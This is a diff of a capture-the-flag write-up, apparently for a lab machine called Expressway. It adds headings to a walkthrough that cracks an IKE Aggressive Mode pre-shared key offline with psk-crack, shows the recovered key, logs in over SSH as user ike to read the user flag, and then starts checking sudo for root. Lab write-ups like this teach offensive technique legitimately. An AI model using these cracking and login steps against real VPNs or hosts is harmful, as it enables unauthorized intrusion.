@@ -100,7 +100,8 @@ SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=2
 | **Auth = PSK**           | The VPN uses a **Pre-Shared Key** — this is brute-forceable |
 | **Life = 28800s**        | SA lifetime (8 hours)                                       |
 
-
+## Shell as ike
+### Cracking hash
 > PSK authentication (Auth=PSK) can be **offline-bruteforced** if you capture the Aggressive Mode hash and have the correct ID (group name).
 > Main Mode does *not* leak the PSK hash—but you can still brute-force **Group IDs**.
 
@@ -154,27 +155,20 @@ Running in dictionary cracking mode
 key "freakingrockstarontheroad" matches SHA1 hash c9c7b9f8f7dee876bd38e66cb7151cda58dce123
 Ending psk-crack: 8045039 iterations in 13.693 seconds (587538.85 iterations/sec)
 ```
-
+### User flag
 Connnect to SSH as ike.
 ```bash
 ╰─ ssh ike@10.10.11.87                                 
 ike@10.10.11.87's password: 
 Last login: Thu Nov 20 13:11:41 GMT 2025 from 10.10.16.58 on ssh
 Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
 Last login: Thu Nov 20 15:31:09 2025 from 10.10.14.108
 ike@expressway:~$ ls
 user.txt
 ike@expressway:~$ cat user.txt
 03a700b8c72*******************
 ```
-
+## Shell as root
 Itry check sudo but we dont have provelege.
 ```
 ike@expressway:~$ sudo -l
